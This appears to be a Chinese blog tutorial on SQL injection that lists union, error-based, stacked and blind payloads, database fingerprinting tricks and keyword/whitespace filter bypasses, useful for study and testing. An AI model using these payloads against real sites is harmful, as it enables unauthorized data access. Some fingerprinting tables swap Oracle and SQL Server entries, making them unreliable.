---
title: 经典漏洞-SQL注入
excerpt: 原理、类型、检测、权限提升……
index_img: /img/article-head/SQL注入.png
date: "2022/8/4 12:30:25"
updated: "2022/8/10 12:30:25"
hide: false
tags:
- Security
- PenTest
- 经典漏洞
categories:
- Security
- PenTest
- 经典漏洞
---

- [1 原理 & 类型](#1-原理--类型)
  - [1.1 SQL 注入原理](#11-sql-注入原理)
  - [1.2 SQL注入的类型(按技巧分类)](#12-sql注入的类型按技巧分类)
- [2 检测手段](#2-检测手段)
  - [2.1 注入点是否存在 & 数据类型](#21-注入点是否存在--数据类型)
    - [2.1.1 添加单引号](#211-添加单引号)
    - [2.1.2 添加运算符](#212-添加运算符)
  - [2.2 注入类型](#22-注入类型)
    - [2.2.1 堆叠注入](#221-堆叠注入)
    - [2.2.2 报错注入](#222-报错注入)
      - [2.2.2.1 联合查询注入](#2221-联合查询注入)
        - [表的字段数量判断](#表的字段数量判断)
        - [显示字段内容判断](#显示字段内容判断)
      - [2.2.2.2 group by重复建冲突报错](#2222-group-by重复建冲突报错)
      - [2.2.2.3 xpath语法错误](#2223-xpath语法错误)
    - [2.2.3 盲注](#223-盲注)
      - [2.2.3.1 布尔盲注](#2231-布尔盲注)
        - [判断数据库名长度](#判断数据库名长度)
        - [判断数据库名](#判断数据库名)
      - [2.2.3.2 时间盲注](#2232-时间盲注)
- [3 数据库判断](#3-数据库判断)
  - [3.1 常见前端与数据库类型匹配](#31-常见前端与数据库类型匹配)
  - [3.2 数据库标志性信息](#32-数据库标志性信息)
  - [3.3 字符串处理方式](#33-字符串处理方式)
  - [3.4 特殊符号与注释](#34-特殊符号与注释)
- [4 绕过](#4-绕过)
  - [4.1 关键字过滤](#41-关键字过滤)
  - [4.2 空格过滤](#42-空格过滤)
  - [4.3 逗号过滤/拦截](#43-逗号过滤拦截)
  - [4.4 单引号拦截/过滤/转义](#44-单引号拦截过滤转义)
    - [4.4.1 利用编码特性绕过。（宽字节注入）](#441-利用编码特性绕过宽字节注入)
    - [4.4.2 利用反斜杠\绕过](#442-利用反斜杠绕过)
    - [4.4.3 将 utf-8 转换为 utf-16 或 utf-32](#443-将-utf-8-转换为-utf-16-或-utf-32)
  - [4.5 数字被过滤/拦截绕过](#45-数字被过滤拦截绕过)
  - [4.6 等号过滤](#46-等号过滤)
  - [4.7 其他关键字过滤/拦截绕过](#47-其他关键字过滤拦截绕过)
- [参考内容](#参考内容)

# 1 原理 & 类型

## 1.1 SQL 注入原理

基本的SQL查询语句如下所示，其中 `$id` 为提交的变量，当这个参数没有做非常严格的过滤，通过对 `$id` 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

> Tips: `$id` 参数可能存在于任何参数传递的位置：
> - GET/POST/PUT/DELETE 参数
> - X-Forwarded-For(详细内容待补充)
> - 查询、搜索
> - 页码、选择菜单
> - 账号、密码
> - 文件名

## 1.2 SQL注入的类型(按技巧分类)

- 盲注
  - 布尔盲注：只能从应用返回中推断语句执行后的布尔值
  - 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
- 报错注入：应用会显示全部或者部分的报错信息
- 堆叠注入：有的应用可以加入 ; 后一次执行多条语句
- 联合查询注入：

# 2 检测手段

## 2.1 注入点是否存在 & 数据类型

### 2.1.1 添加单引号

修改参数 `$id` 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。

```sql
SELECT * FROM users WHERE id='$id'' LIMIT 0,1
```

### 2.1.2 添加运算符

传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。

如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b

```sql
SELECT * FROM users WHERE id='1+1' LIMIT 0,1;
SELECT * FROM users WHERE id='1%2b1' LIMIT 0,1;
```

## 2.2 注入类型

### 2.2.1 堆叠注入

分号 `;` 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。

> Tips: 堆叠注入存在局限性
> 1. 结果不会在页面显示
> 2. 接口或者数据库引擎不支持

```sql
SELECT * FROM users WHERE id='1';SELECT 1,database(),version(),4,5
```

### 2.2.2 报错注入

#### 2.2.2.1 联合查询注入

##### 表的字段数量判断

在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 `$id` 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。

```sql
SELECT * FROM users WHERE id='1' order by 1 --+ LIMIT 0,1;
```

##### 显示字段内容判断

union 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1=2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 

```sql
SELECT * FROM users WHERE id='-1' union select 1,2,3,4,5 --+ LIMIT 0,1;
SELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3,4,5 --+ LIMIT 0,1;

SELECT * FROM users WHERE id='-1' UNION SELECT 1,database(),version(),4,5 --+
```

#### 2.2.2.2 group by重复建冲突报错

```sql
SELECT * FROM users WHERE id='2' and (
    select 1 from (
        select count(*),concat(
            (
                select database() from information_schema.tables limit 0,1  --+ 真正的查询语句
            ),floor(rand()*2)
        )x from information_schema.tables group by x
    )a
) --+
```

#### 2.2.2.3 xpath语法错误

xpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  

使用方法：

```sql
SELECT * FROM users WHERE id='2' and extractvalue(1,concat('^',(
    select database()  --+ 真正的查询语句
    ),'^')) --+

SELECT * FROM users WHERE id='2' and updatexml(1,concat('^',(
    select database()  --+ 真正的查询语句
    ),'^'),1) --+
```

### 2.2.3 盲注

#### 2.2.3.1 布尔盲注

##### 判断数据库名长度

改变length(database())=的数值，当条件为真时，页面就会正常显示

```sql
SELECT * FROM users WHERE id='2' and length(database())=1 --+
```

##### 判断数据库名

使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示

```sql
SELECT * FROM users WHERE id='2' and substr(database(),1,1)='s' --+
```

#### 2.2.3.2 时间盲注

当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。

```sql
SELECT * FROM users WHERE id='1' and sleep(10) -- +' LIMIT 0,1;
SELECT * FROM users WHERE id='1' and if((length(database())=8),sleep(10),1) --+
SELECT * FROM users WHERE id='1' and if((substr(database(),1,1)='s'),sleep(10),1) --+
```

# 3 数据库判断

## 3.1 常见前端与数据库类型匹配

| 前端语言 | 数据库 |
| - | - |
sap | sql server，Access
.net | sql server
php | PostgreSQL, Mysql
java | mysql, oracle

## 3.2 数据库标志性信息

| 数据库 | 信息查询 |
| - | - |
oracle | select@@version --
sql server | select banner from v$version
mysql | select @@version, version() --, lenth(user)>0
postgreSQL | select version() --

## 3.3 字符串处理方式

| 数据库 | 处理方式 |
| - | - |
sql server | id=1 and 'a'+'b'='ab' --
mssql | id=1 and 'a'+'b'='ab'
mysql | id=1 and 'a'+'b'='ab', 'ab'=concat('a','b')
oracle | id=1 and 'a'+'b'='a'\|\|'b', 'ab'=concat('a','b')
postgresql | id=1 and 'a'+'b'='a'\|\|'b', 'ab'=concat('a','b')

## 3.4 特殊符号与注释

1. null 和 %00 是Access支持的注释。
2. \# 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’-- ',和/* */注释（注意mysql使用-- 时需要后面添加空格）
3. – 和 /* */ 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。
4. ; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。

```sql
' and exists (select count(*) from sysobjects) >0 正常，就是MSSQL数据库
' and exists (select count(*) from msysobjects) >0 两条都不正常，是Access数据库
```

# 4 绕过

## 4.1 关键字过滤

- 第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；
- 第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。

## 4.2 空格过滤

- 使用/**/即SQL语句中的注释语句来绕过。
- 使用双写URL编码绕过，例如(%20 → %2%200)。
- 通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）
- 通过科学计数法绕过：where id=0e1union select 1,2
- Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。

| URL编码 | 符号 |
| - | - |
%09 | TAB 键（水平）
%0a | 新建一行
%0c | 新的一页
%0d | return 功能
%0b | TAB 键（垂直）
%a0 | 空格

数据库 | 空白字符
| - | - |
SQLite3 | 0A 0D 0C 09 20
MYSQL5 | 09 0A 0B 0C 0D A0 20
PosgresSQL | 0A 0D 0C 09 20
Oracle 11g | 00 0A 0D 0C 09 20
MSSQL | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20

## 4.3 逗号过滤/拦截

拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。

substring和if语句都用到了逗号，因此无法使用。

substring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。


## 4.4 单引号拦截/过滤/转义

当引号存在过滤和转义的情况下，可以这样处理：

### 4.4.1 利用编码特性绕过。（宽字节注入）

比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。

待补充

### 4.4.2 利用反斜杠\绕过

待补充

### 4.4.3 将 utf-8 转换为 utf-16 或 utf-32

待补充

## 4.5 数字被过滤/拦截绕过

数字被屏蔽时，用响应函数结果来构造。

- ceil() ：为向上取整函数
- floor()：为向下取整函数
- ! ~~：起到取反的效果
- pi() ：π值
- version()：利用当前版本号进行数字的构造
- false：值为0
- true：值为1

## 4.6 等号过滤

- 当等于号=呗过滤时，可以使用：like,in 等字符替换

```sql
?id=1' or '1' IN ('1234')#
?id=1' or 1 like 1#
```

## 4.7 其他关键字过滤/拦截绕过

关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：

关键字 | 双写 | 大小写 | 其他编码 | 符号
| - | - | - | - | - |
and | aandnd | and | an\x64 | &&
select | selselectect | SelECt | selec\x74 | 
or | oorr | oR | o\x72 | \|\|
union | uniunionon | uNioN | unio\x6e | 

# 参考内容

[sql注入总结](https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/)

[注入天书](https://files.cnblogs.com/files/lcamry/mysql-injection.pdf)
